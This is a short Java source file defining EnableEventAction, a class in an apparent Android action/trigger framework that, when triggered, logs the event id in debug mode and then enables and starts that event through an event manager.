package com.android.deviceinfo.action;

import com.android.deviceinfo.Trigger;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.conf.ConfAction;
import com.android.deviceinfo.manager.ManagerEvent;
import com.android.deviceinfo.util.Check;

public class EnableEventAction extends EventAction {
	private static final String TAG = "EnableEventAction";

	public EnableEventAction(ConfAction params) {
		super(params);
	}

	@Override
	public boolean execute(Trigger trigger) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (execute): " + eventId);//$NON-NLS-1$
		}
		
		final ManagerEvent eventManager = ManagerEvent.self();

		eventManager.enable(eventId);
		eventManager.start(eventId);
		
		return true;
	}

}
